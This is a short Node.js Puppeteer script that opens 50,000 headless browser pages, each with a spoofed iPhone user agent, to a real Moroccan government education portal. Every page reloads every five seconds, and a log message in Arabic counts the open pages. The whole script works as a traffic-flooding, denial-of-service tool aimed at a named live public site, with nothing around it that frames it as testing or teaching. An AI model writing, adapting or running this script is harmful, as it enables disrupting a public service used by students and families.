const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const userAgent = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1';
  let pageCount = 0;

  for (let i = 0; i < 50000; i++) {
    const page = await browser.newPage();
    await page.setUserAgent(userAgent);
    await page.setViewport({ width: 414, height: 896 }); // Viewport for iPhone 12 Pro Max
    await page.goto('https://massar.men.gov.ma');
    
    setInterval(async () => {
      await page.reload();
    }, 5000);
    
    pageCount++;
  }

  setInterval(() => {
    console.log(`عدد الصفحات المفتوحة: ${pageCount}`);
  }, 1000);
})();
